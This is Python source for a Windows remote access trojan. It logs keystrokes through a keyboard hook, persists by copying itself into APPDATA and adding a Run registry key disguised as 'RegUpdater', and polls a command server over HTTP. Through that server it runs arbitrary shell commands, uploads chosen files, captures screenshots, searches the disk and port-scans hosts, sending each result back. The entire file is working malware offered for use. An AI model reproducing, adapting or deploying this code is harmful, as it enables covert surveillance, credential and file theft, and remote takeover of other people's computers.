
import requests as req 
from subprocess import Popen, PIPE
from time import sleep
from random import randrange
from PIL import ImageGrab
from tempfile import mkdtemp
from shutil import copy, rmtree
import socket 
import winreg as wreg
import os
from pythoncom import PumpMessages
from pyWinhook import HookManager

def keypressed(event):
    global store
    # Enter and backspace are not handled properly that's why we hardcode their values to < Enter > and <BACK SPACE>
    # note that we can know if the user input was enter or backspace based on their ASCII values
    keys = ''
    if event.Ascii==13:
        keys=' < Enter > ' 
    elif event.Ascii==8:
        keys=' <BACK SPACE> '
    else:
        keys=chr(event.Ascii)
    store += keys 
    
    fp=open("keylogs.txt","w")
    fp.write(store)
    fp.close()
    return True

# string where we will store all the pressed keys
store = ''
# create and register a hook manager and once the user hit any keyboard button, 
# keypressed func will be executed
obj = HookManager()
obj.KeyDown = keypressed
# start the hooking loop and pump out the messages
obj.HookKeyboard()
PumpMessages()

class WebClient:
    def __init__(self):
        self.SERVER_IP = '192.168.0.123'
        self.SERVER_PORT = 5000
        # Persistence I: copy script to random appdata location
        self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
        self.PATH = os.path.realpath(__file__)
        copy(self.PATH, self.APPDATA_PATH)
        # Persistence II: registry key pointing to the copied file
        self.addRegkey()

    def addRegkey(self):
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, self.APPDATA_PATH)
        key.Close()
    
    def scanner(self, ip, ports):
        scan_result = ''
        for port in ports.split(','): 
            # ports are separated by a comma in this format 21,22,..
            # make a connection using socket library for EACH one of these ports
            try:   
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # connect_ex returns 0 if the operation succeeded, and in our case operation succeeded means that 
                # the port is open otherwise the port could be closed or the host is unreachable in the first place.
                output = sock.connect_ex((ip, int(port) )) 
                
                if output == 0:
                    scan_result += f"[+] Port {port} is opened\n"
                else:
                    scan_result += f"[-] Port {port} is closed or Host is not reachable\n" 
                    
                sock.close()
        
            except Exception as e:
                pass
        # send results to server
        req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data = scan_result ) 

    def run(self):
        while True: 
            # Send GET request to server
            get_req = req.get(f'http://{self.SERVER_IP}:{self.SERVER_PORT}') 
            # store received txt into command variable
            command = get_req.text 
            if 'terminate' in command:
                break 
            elif 'cd' in command:
                cur_path = os.getcwd()
                com, directory = command.split()
                new_path = f"{cur_path}\\{directory}"
                try: 
                    os.chdir(new_path)
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=b"Directory changed." ) 
                except Exception as e:
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=str(e).encode() ) 
            elif 'grab' in command:
                path = command.split()[-1] 
                if os.path.exists(path): 
                    # Appended /store in the URL
                    url = f'http://{self.SERVER_IP}:{self.SERVER_PORT}/store'
                    
                    files = {'filename':path, 'file': open(path, 'rb')} 
                    # Send the file, requests use POST method called "multipart/form-data"
                    r = req.post(url, files=files) 
                else:
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data='[!] File not found.' )
            elif 'screenshoot' in command: 
                # on screenshoot, take screen image and send it to server 
                dirpath = mkdtemp()
                ImageGrab.grab().save(dirpath + "/screen.jpg", "JPEG")
                url = f'http://{self.SERVER_IP}:{self.SERVER_PORT}/store' 
                files = {'filename':"screen.jpg", 'file': open(dirpath + "/screen.jpg", 'rb')}
                # Transfer the file over HTTP
                r = req.post(url, files=files) 
                files['file'].close() 
                # Remove temp dir
                rmtree(dirpath) 
            elif 'search' in command: 
                # cut off 'search' keyward, output would be C:\\*.pdf
                command = command[7:] 
                # split command to path and ext
                path, ext = command.split('*') 
                file_list = '' 
                
                for dirpath, dirnames, files in os.walk(path):
                    for f in files:
                        if f.endswith(ext):
                            file_list = file_list + '\n' + os.path.join(dirpath, f)
                # Send search result to server
                req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data = file_list ) 
            elif 'scan' in command: 
                # syntax: scan 10.0.2.15:22,80
                # cut off 'scan' keyward
                command = command[5:]
                ip, ports = command.split(':') 
                self.scanner(ip, ports)
            else:
                cmd = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
                # POST results
                post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=cmd.stdout.read() ) 
                # or error 
                post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=cmd.stdout.read() )

            # sleep(3)

def main():
    c = WebClient()
    # Persistence III: if can't connect to server sleep for 1 - 10 seconds
    while True:
        try:
            if c.run():
                break
        except:
            sleep_for = randrange(1, 10)
            sleep( sleep_for )

if __name__ == "__main__":
    main()